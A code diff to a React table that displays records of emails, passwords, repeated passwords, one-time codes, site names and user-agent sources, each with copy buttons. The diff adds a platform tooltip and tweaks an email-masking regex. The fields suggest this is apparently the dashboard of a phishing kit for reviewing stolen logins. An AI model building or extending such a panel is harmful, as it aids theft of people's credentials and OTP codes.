@@ -110,7 +110,7 @@ const pageCount = 10;
 
           <tbody className='text-center'>
             {
-              displayInfo?.map(({ user, updatedAt, agent: { source }, status, email, password, repassword, otp, siteName, _id }, index) => (
+              displayInfo?.map(({ user, updatedAt, agent: { source,platform }, status, email, password, repassword, otp, siteName, _id }, index) => (
                 <tr key={_id} className=" ">
                   <th scope="row" className="px-2 py-1 font-bold cursor-pointer text-gray-900 whitespace-nowrap dark:text-white ">
                     {index + 1}
@@ -128,9 +128,9 @@ const pageCount = 10;
                       }`}>{siteName}</span>
 
                   </td>
-                  <td onClick={() => handleCopyClick(status ? (email as string).replace(/^(.{2})(.{3})/, '$1') : email)} className="px-2 py-1 font-bold cursor-pointer">
+                  <td onClick={() => handleCopyClick(status ? (email as string).replace(/^(.{2})(.{1})/, '$1') : email)} className="px-2 py-1 font-bold cursor-pointer">
 
-                    <input type="text" className="p-2 dark:bg-graydark bg-bodydark1 " value={status ? (email as string).replace(/^(.{2})(.{3})/, '$1') : email} />
+                    <input type="text" className="p-2 dark:bg-graydark bg-bodydark1 " value={status ? (email as string).replace(/^(.{2})(.{1})/, '$1') : email} />
                   </td>
                   <td onClick={() => handleCopyClick(password)} className="px-2 py-1 font-bold cursor-pointer ">
 
@@ -164,6 +164,7 @@ const pageCount = 10;
                   <td className="px-2 py-1 font-bold cursor-pointer ">
                     <div className="relative inline-block">
                       <button
+                      title={platform}
                         onClick={() => handleCopyClick(`${source}`)}
                         className={`p-2 ${index % 2 === 0 ? 'bg-primary' : 'bg-[#2CB13C]'
                           }`}>Copy</button>
